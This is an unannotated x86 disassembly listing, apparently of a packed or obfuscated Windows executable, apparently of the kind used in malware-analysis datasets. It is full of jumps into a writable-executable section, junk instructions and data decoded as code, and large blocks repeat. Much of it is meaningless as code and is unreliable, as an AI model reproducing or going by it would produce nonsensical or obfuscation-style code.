or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_515600
pushfd
pushad
xchg ecx eax
mov [ esp ] cl
jmp rwxdata
dec eax
pushfd
pushfd
shl eax 0x8
pushfd
lodsb [ esi ]
clc
clc
push 0xaa9b9f26
push [ esp + 0x4 ]
not al
bt bp 0xe
jmp rwxdata
push [ esp + 0x1c ]
ror al 0x2
push eax
dec al
clc
mov [ esp + 0xc ] ch
call j_sub_517148
add [ eax ] al
inc edi
je rwxdata
stc
test [ edi ] cl
jae rwxdata
cmp dh dh
shr bl cl
shl bx cl
mov bx [ esi ]
pushfd
and ebx 0xfff
call sub_514f4a
add [ eax ] al
dec ebp
outsd
jne rwxdata
cmc
cmc
cmp ebx 0x3
pushad
call sub_4cd011
lea esp [ esp + 0x24 ]
jae rwxdata
add esp [ eax - 0x18 ]
test eax 0x8dfffb7b
and al 0x24
jb rwxdata
mov ebx 0xafc2bff4
ror [ esi - 0x62305f19 ] cl
0x34ffda84 0x8524
[ eax + 0x2c24648d ]
xor esi [ gs : edx ]
dec esi
js rwxdata
jmp rwxdata
jmp rwxdata
pushad
lea esp [ esp + 0x28 ]
je rwxdata
push 0xf84f98d
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx * 2 + 0x6e ] si
outsw
jb rwxdata
rol bl cl
shrd ebx eax 0x16
sub eax eax
sete bl
movzx bx bl
not edi
bswap si
pop ebx
jmp rwxdata
bswap si
ror si cl
btr si bx
sbb esi esi
add edi ebx
sar esi 0x1f
mov esi [ edx ]
cmp ch dh
pushfd
test esi esi
pushad
lea esp [ esp + 0x24 ]
je rwxdata
je rwxdata
xor al 0x24
test edi edi
pushfd
pushad
lea esp [ esp + 0x2c ]
add ah al
jbe rwxdata
push 0xe54feceb
mov [ esp ] 0x9e49
lea esp [ esp + 0x4 ]
call sub_514aff
push 0x73519e81
pushad
adc al al
jmp rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jb rwxdata
add [ eax + 0x21 ] ch
adc eax eax
push es
popad
je rwxdata
call sub_516af7
adc si dx
clc
stc
add esi ebx
push 0x116783e1
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
jne rwxdata
insb
les edi [ ebx - 0x32 ]
push esi
iretd
pushad
push [ esp + 0x4 ]
mov [ esp + 0x8 ] edi
lea esp [ esp + 0x48 ]
jae rwxdata
call j_sub_5156a9
add [ eax ] al
inc edx
imul esi [ edx + eax * 2 + 0x6c ] 0xe9600074
aad 0xf8
jne rwxdata
call sub_519048
mov dl 0x9a
add [ eax ] al
push 0x6c01121
outsd
outsb
push edi
add al ch
out dx al
adc [ eax ] eax
add [ ebp + 0xf442464 ] cl
xchg edx esi
mov ebp 0x4160fffb
pushfd
inc bl
call sub_4ba811
add [ eax ] al
push edi
jb rwxdata
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
pushad
jmp rwxdata
jpe rwxdata
pushfd
stosb [ edi ]
mov [ esp ] 0x54f5
push [ esp ]
lea esp [ esp + 0x8 ]
jmp rwxdata
popad
je rwxdata
pushfd
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
call sub_5191a9
fcmove st5
pop eax
imul esi [ ebx + 0x6b ] 0x65657246
push ebx
jo rwxdata
popad
je rwxdata
inc esi
imul ebp [ ebp ] 0x8246488
lea esp [ esp + 0x44 ]
je rwxdata
lea esp [ esp + 0x24 ]
jne rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
add [ eax - 0x58 ] ch
adc al al
jle __import_name_0(KERNEL32:GetCurrentProcess)
jle rwxdata
mov esp 0x4601781d
cmp al 0x69
mov [ 0xffffffffe9ef6996 ] ch
lodsb [ si ]
cmpsd [ esi ] [ edi ]
arpl [ ebp + 0x45 ] sp
js rwxdata
jb rwxdata
bound esp [ ecx + 0x73 ]
add [ gs : esi - 0x75 ] ah
push ds
bt dx ax
bt si 0x9
bt bp 0x3
pushad
shr ebx 0xc
stc
cmp ebx 0x1
call sub_515994
add [ eax ] al
inc edi
je rwxdata
cmp ax cx
setns bl
shrd bx si 0x8
push 0x5fb38d27
mov bx [ esi ]
pushfd
and ebx 0xfff
jmp rwxdata
stc
push 0x36eb56d9
stc
cmp ebx 0x2
jmp rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
inc edi
je rwxdata
in al dx
outsd
bswap esi
lahf
cmp al 0x0
add dl bl
int 0x58
mov edi 0x6bd472f
in al 0x62
mov dl 0x70
sti
insb
imul [ edx + 0x7c5df96f ]
mov al 0x27
mov ecx 0x319e2d58
mov eax [ 0xffffffffbc36a200 ]
sbb eax 0x3c460178
imul ecx [ eax - 0x109669d3 ] 0xa7ac67e9
push 0x9447f669
mov ebp 0xd6af0e06
pushfd
cmp [ edi ] eax
add [ ebp - 0x185c2d04 ] ecx
cmpsb [ es : esi ] [ edi ]
sar [ ebp - 0x536ddcb0 ] cl
je rwxdata
add [ ebx - 0x54f099c2 ] cl

salc
arpl [ ebp + 0x73 ] sp
jae rwxdata
test esi ebp
add [ edi + ebx ] ax
pushfd
push [ esp + 0x4 ]
push 0x7ff9b3ca
lea esp [ esp + 0x14 ]
jmp rwxdata
jmp rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
xchg esi eax
imul ebp edi 0xa7ac67e9
jne rwxdata
push 0x7ec010a8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
stosb [ edi ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
cli
stc
dec edi
loopne rwxdata
jb rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
push cs
scasd [ edi ]
salc
sbb dl bh
sub al 0xd3
xchg esp eax
movsd [ edi ] [ esi ]
adc bl [ edi - 0x12 ]
pushfd
mov ebx 0x66909afa
xchg ecx eax
test al 0x38
xchg esi eax
cld
cdq
fsubr st5
outsd
dec eax
mov [ 0xffffffffd2a626e7 ] eax
mov ebp 0xac922350
outsb
je rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
cmp [ edx + 0x26 ] dh
mov edi 0x68ab77ca
cli
jb rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
btc ax 0x1
aaa
mov esi edi
arpl [ eax + eax + 0x66 ] si
adc esi edx
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_515658
mov [ esp ] 0x64eb
lea esp [ esp + 0x2c ]
ja rwxdata
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
pushfd
not bl
inc ecx
push eax
pushfd
not bl
mov bl dh
inc ecx
clc
xchg ebp eax
stc
inc al
mov eax ebp
neg bl
mov bl 0x1
bt ax ax
pushfd
mov [ esp + 0xc ] esi
pushfd
mov [ esp + 0x4 ] si
mov esi edi
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
stc
push [ esp + 0x4 ]
mov [ esp + 0xc ] 0x37
sub esi eax
pushfd
push edx
[ edi ] [ esi ]
not si
mov esi [ esp + 0x1c ]
mov [ esp + 0x4 ] ebp
push 0xc3dbf82b
mov [ esp ] 0xcd
pushfd
lea esp [ esp + 0x28 ]
jmp rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
